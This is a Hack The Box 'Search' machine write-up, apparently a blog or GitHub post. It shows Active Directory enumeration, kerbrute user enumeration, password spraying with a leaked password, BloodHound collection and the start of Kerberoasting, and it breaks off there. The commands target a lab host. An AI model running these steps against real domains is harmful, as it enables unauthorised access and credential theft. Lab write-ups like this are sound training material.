![image](https://user-images.githubusercontent.com/64952843/165166129-a70c82e7-12d8-4280-965e-f8cdd97b6913.png)

# [SEARCH- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine,Search created by dmw0ng.So without any further intro, let's jump in.

# common enumeration

## Nmap
  *TCP over SSH
  *HTTP Default page
  *Host windows server
  
#### code-Nmap

```bash
nmap -sC -sV  -A -oN nmap/search 10.10.11.129
```


#### output

![[namp.png]]

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 02:28 EDT
Nmap scan report for 10.10.11.129
Host is up (0.26s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-06 06:29:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-06T06:31:04+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-05-06T06:31:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-06T06:31:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-06T06:31:04+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-05-06T06:31:04+00:00; +1s from scanner time.
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-05-06T06:30:04
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.87 seconds
```

Elven ports are open:
port[53]- domain 
port[80]-http
port[88]-kerberos-sec
port[135]- netbios-ssn
port[445]-microsoft-ds?
port[464]-kpasswd5?
port[593/]-ncacn_http    
port[636]- ssl/ldap      
port[443]-ssl/http
port[3268]-  ldap
port[3269]-ssl/ldap

being a windows server let get the host so as to confirm the host by doing this using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation)

#### code-Get host
```bash
cme smb 10.10.11.129
```

#### output
![[domain.png]]

we need to add the hostname to ``/etc/hosts ``file 

#### code-/etc/hosts
```bash
echo 10.10.11.129 search.htb > /etc/hosts
```


## Default Page-RESEARCH
so lets check the default page [Resarch](http://10.10.11.129)

![[Search/search png/web.png]]

sine this is a windows server and there active directory i found out that the users in our team could be potential users on the box

![[Search/search png/users.png]]

so i decide to copy there names and filter it so as to make `potential usernames` by copy pasteing our team then removing Image and Manager as this are not potential names by 

#### code-Filter
```bash
cat users.txt |grep -v 'Image\|Manger' |grep . > user.txt
```

#### output

![[remove.png]]

so lets filter this name to possible users using there `firstnames` ,`lastnamee` and `first and lastname with a break` using a ruby tool called [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

#### code-anarchy
```bash
./username-anarchy  --input-file /home/leshack98/project/HTB/Search/users.txt --select-format first,first.last,f.last,flast > /home/leshack98/project/HTB/Search/newusers.txt
```

#### output

![[newusers.png]]

so we have a long big username file so i would want to check valid users usinf a tool called `kerbrute` which is a tool to quickly `bruteforce` and `enumerate` valid` Active Directory accounts` through Kerberos Pre-Authentication.[kerbrute](https://github.com/ropnop/kerbrute)

#### code-kerbrute
```bash
 kerbrute userenum --dc 10.10.11.129 -d search.htb newusers.txt 
```

#### output

![[kerbrute.png]]

we find three valid username valid with the format of `fastname.lastname` so i decide to check for more users in the web and foundin our Features image another hint 

#### output

![[hope.png]]

it has been written send passwor to `Hope Sharp` and a passord `IsolationIsKey?`

#### output

![[sharp.png]]


so l decide to add `Hope Sharp` to `newusers.txt` so that i can use `Kerbrute` to see if she is a valid user

#### output

![[kerbrutenew.png]]

as you can see know we have Four username and Hope is also a valid user so lets check for the password to all the users by switching our mode to `passwordspray` using the following code.

#### code-kerbrute
```bash
kerbrute passwordspray --dc 10.10.11.129 -d search.htb newusers.txt 'IsolationIsKey?
```

#### output

![[passwordhope.png]]

 i find a valid login for sharp so i decide to check if can be able to login with with the user by passing it to `crackmapexec  
 
```bash
cme smb  10.10.11.129 -u hope.sharp -p 'IsolationIsKey?'
```

![[crack.png]]

i get a login but  it does not say `pound` so we cannot use it so i decide to use `BloodHound` which is an **Active Directory (AD) reconnaissance** tool that can reveal hidden relationships and identify attack paths within an AD environment.

so lets setup a our bloodhound python injester using  virtual enviroment **if python** has some issue while executing this script because of its lib having dependency conflicts by doing this 

#### code-enviroment
```bash
python3 -m venv .search
```

#### code-enviroment
```bash
source .search/bin/activate
```

#### output

![[enviroment.png]]

**if not** you can setup you bloodhound python injester just as usual 

#### code-bloodhound.py
```bash
python3 bloodhound.py -u hope.sharp -p 'IsolationIsKey?' -d search.htb -ns 10.10.11.129 -c All 
```

#### output

![[bloodhoundpy.png]]

so lets start a `neo4j`  which Neo4j **facilitates personal data storage and management**: it allows you to track where private information is stored and which systems, applications, and users access it. The graph data model helps visualize personal data and allows for data analysis and pattern detection using this 

#### code-neo4j
```bash
sudo neo4j console
```

#### output

![[neo4j.png]]


Then we start our [BloodHound](https://github.com/BloodHoundAD/BloodHound) if you are new then go change  credential on [neo4j website](http://localhost:7474/browser/)
so let upload our `json` file that we generated with the BloodHound injester using python3 to `Bloodhound`.

#### output

![[json.png]]

In `BloodHound` the first thing i do is to check for list of `all Domain Admin` and i find `two members` one has a diamond who is a user with a high value and the other does not have it so i decide to flag him with a diamond to as user of high value

#### output

![[admins.png]]

so next i decide to check for ` Kerberoastable Accounts` if two of them 
**.** KRBGT@SEARCH.HTB
**.** WEB_SVC@SEARCH.HTB

#### output

![[kerbetous.png]]

so i decide to use `impacket` to dump WEB_SVC@SEARCH.HTB Using the **GetUserSPNs**.py script from [Impacket](https://github.com/SecureAuthCorp/impacket) in combination with Hashcat to perform the "Kerberoasting" attack, to get a useraccounts password
